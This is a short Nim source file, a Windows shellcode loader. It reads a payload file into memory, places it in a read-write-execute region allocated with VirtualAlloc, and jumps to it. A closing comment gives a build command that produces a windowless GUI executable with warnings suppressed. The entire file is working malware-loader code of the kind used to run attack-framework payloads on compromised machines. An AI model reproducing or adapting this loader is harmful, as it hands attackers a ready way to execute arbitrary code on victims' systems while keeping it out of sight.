import winim/lean
var filename = "REPLACE_FILE"
var file: File = open(filename, fmRead)
var fileSize = file.getFileSize()
var shellcode = newSeq[byte](fileSize)
discard file.readBytes(shellcode, 0, fileSize)
type
    buf* = LPVOID
var rez = VirtualAlloc(nil, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
copyMem(rez, shellcode[0].addr, fileSize)
let feadway = cast[proc(){.nimcall.}](rez)
feadway()


#nim c --hints:off --warnings:off -d:danger -d:mingw --app:gui loader.nim